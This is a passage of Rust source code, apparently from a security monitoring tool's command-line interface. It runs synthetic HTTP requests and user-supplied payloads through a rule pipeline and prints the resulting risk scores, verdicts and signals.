                .map(|p| (p.name.clone(), p.mode.clone()))
                .collect()
        })
        .unwrap_or_default();
    let rules = build_default_ruleset(&pack_modes);
    let routes = cfg
        .as_ref()
        .map(|c| RouteValidator::from_config(&c.routes.known))
        .unwrap_or_default();
    let scorer = cfg.as_ref().map(|c| c.scorer.clone()).unwrap_or_default();
    let policy = cfg
        .as_ref()
        .map(|c| {
            sentry_core::VerdictPolicy::from_config(&c.policy)
                .unwrap_or_else(|_| sentry_core::VerdictPolicy::default())
        })
        .unwrap_or_default();
    let pipeline = Pipeline::with_config(
        std::sync::Arc::new(std::sync::RwLock::new(rules)),
        routes,
        scorer,
        policy,
    );

    let client_ip: std::net::IpAddr = ip
        .as_deref()
        .and_then(|s| s.parse().ok())
        .unwrap_or(std::net::IpAddr::V4(Ipv4Addr::new(192, 168, 1, 1)));

    let mut http = HttpData {
        method: Some(HttpMethod::from_str_lossy(method)),
        path: path.to_string(),
        ..Default::default()
    };
    if let Some((p, q)) = path.split_once('?') {
        http.path = p.to_string();
        http.query = Some(q.to_string());
    }
    if let Some(ua_str) = ua {
        http.user_agent = Some(ua_str.clone());
    }

    let evt = Event::new(SourceKind::Synthetic, client_ip, ProtocolData::Http(http));
    let result = pipeline.process(&evt);

    println!("┌─ Rule Test ────────────────────────────────────────────");
    println!("│ Path:     {path}");
    println!("│ Method:   {method}");
    println!("│ IP:       {client_ip}");
    if let Some(ua) = ua {
        println!("│ UA:       {ua}");
    }
    println!("│");
    println!("│ Score:    {}/100", result.analysis.risk_score);
    println!("│ Level:    {:?}", result.analysis.risk_level);
    println!("│ Verdict:  {:?}", result.decision.action);
    if let Some(rule_id) = &result.rule_hit {
        println!("│ Rule:     {rule_id} (short-circuit)");
    }
    if !result.analysis.signals.is_empty() {
        println!("│ Signals:");
        for s in &result.analysis.signals {
            println!(
                "│   - {:?} (weight {}): {}",
                s.kind,
                s.weight,
                s.detail.as_deref().unwrap_or("")
            );
        }
    } else {
        println!("│ Signals:  (none)");
    }
    println!("└────────────────────────────────────────────────────────");

    Ok(())
}

/// Run the pipeline on a single synthetic payload and print the result.
fn test_payload(payload: &str, path: &str, method: &str) -> color_eyre::Result<()> {
    use sentry_core::event::{Event, HttpData, HttpMethod, ProtocolData, SourceKind};
    use sentry_core::packs::build_default_ruleset;
    use sentry_core::pipeline::{Pipeline, RouteValidator};
    use std::collections::HashMap;
    use std::net::Ipv4Addr;

    let rules = build_default_ruleset(&HashMap::new());
    let routes = RouteValidator::default();
    let pipeline = Pipeline::new(rules, routes);

    let mut http = HttpData {
        method: Some(HttpMethod::from_str_lossy(method)),
        path: path.to_string(),
        ..Default::default()
    };
    if let Some((p, q)) = path.split_once('?') {
        http.path = p.to_string();
        http.query = Some(q.to_string());
    }
    if http.query.is_none() && !payload.is_empty() {
        http.query = Some(payload.to_string());
    }
    if payload.starts_with('/') {
        http.path = format!("{path}{payload}");
    }

    let evt = Event::new(
        SourceKind::Synthetic,
        std::net::IpAddr::V4(Ipv4Addr::new(192, 168, 1, 1)),
        ProtocolData::Http(http),
    );

    let result = pipeline.process(&evt);

    println!("┌─ Analysis Result ──────────────────────────────────────");
    println!("│ IP:       {}", evt.client_ip);
    println!(
        "│ Path:     {}",
        evt.http().map(|h| h.path.as_str()).unwrap_or("(none)")
    );
    println!("│ Method:   {method}");
    println!("│ Payload:  {payload}");
    println!("│");
    println!("│ Score:    {}/100", result.analysis.risk_score);
    println!("│ Level:    {:?}", result.analysis.risk_level);
    println!("│ Verdict:  {:?}", result.decision.action);
    if let Some(rule_id) = &result.rule_hit {
        println!("│ Rule:     {} (short-circuit)", rule_id);
    }
    if !result.analysis.signals.is_empty() {
        println!("│ Signals:");
        for s in &result.analysis.signals {
            println!(
                "│   - {:?} (weight {}): {}",
                s.kind,
                s.weight,
                s.detail.as_deref().unwrap_or("")
            );
        }
    } else {
        println!("│ Signals:  (none)");
    }
    println!("└────────────────────────────────────────────────────────");

    Ok(())
}

/// Stream events to stdout, one per line.
async fn tail_stream() -> color_eyre::Result<()> {
    println!("tail stream — connect to a running daemon (F2).");
    println!("For now, use `sentry run` to process events live.");
    Ok(())
}
